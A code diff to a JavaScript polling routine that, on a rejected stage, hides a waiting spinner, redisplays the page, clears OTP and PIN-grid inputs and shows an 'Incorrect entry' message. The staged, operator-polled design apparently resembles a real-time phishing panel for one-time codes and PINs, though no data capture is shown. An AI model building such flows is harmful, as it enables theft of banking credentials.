@@ -612,33 +612,29 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
         // 1. Hide the full-page waiting spinner overlay screen
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // 2. Bring the current page section (e.g., Page 3) back into view
-        const currentSection = document.getElementById(currentPageId);
-        currentSection.classList.remove("hidden");
+        // 2. Force the current page section back into view
+        document.getElementById(currentPageId).classList.remove("hidden");
         
-        // 3. Clear and re-enable inputs SPECIFIC to this active page container
-        // This clears standard text boxes/OTP fields inside this section
-        const textInputs = currentSection.querySelectorAll('input[type="text"], input[type="password"], input:not([type])');
-        textInputs.forEach(input => {
-          input.value = '';
-          input.disabled = false;
-        });
-
-        // This clears individual PIN grids (.boxes input) inside this section
+        // 3. Clear out old entries from text boxes and individual PIN grids
+        // It looks globally for your inputs, or specifically within the page
+        const currentSection = document.getElementById(currentPageId);
+        
+        const otpInput = document.getElementById('code1') || currentSection.querySelector('input[type="text"]');
+        if (otpInput) otpInput.value = '';
+        
+        // Target whatever PIN grids are inside the active page section
         const pinBoxes = currentSection.querySelectorAll('.boxes input');
         pinBoxes.forEach(box => {
           box.value = '';
-          box.disabled = false; 
+          box.disabled = false; // Re-enable boxes so users can re-type entries
         });
         
-        // 4. Reset the primary continue button inside this section back to locked state
-        // It looks for a button containing 'submit' or a button element to disable
-        const submitBtn = currentSection.querySelector('button, input[type="submit"]');
-        if (submitBtn) {
-          submitBtn.disabled = true;
-        }
+        // 4. Reset the primary continue button back to its initial locked style state
+        // It looks for your exact ID first, falls back safely if it's named differently on page 3
+        const submitBtn = document.getElementById('submitCode1') || currentSection.querySelector('button');
+        if (submitBtn) submitBtn.disabled = true;
 
-        // 5. Alert user about the correction step
+        // 5. Alert user about the correction step without blocking the interface view
         msgElement.className = "error";
         msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
@@ -648,4 +644,3 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
     }
   }, 2500);
 }
-
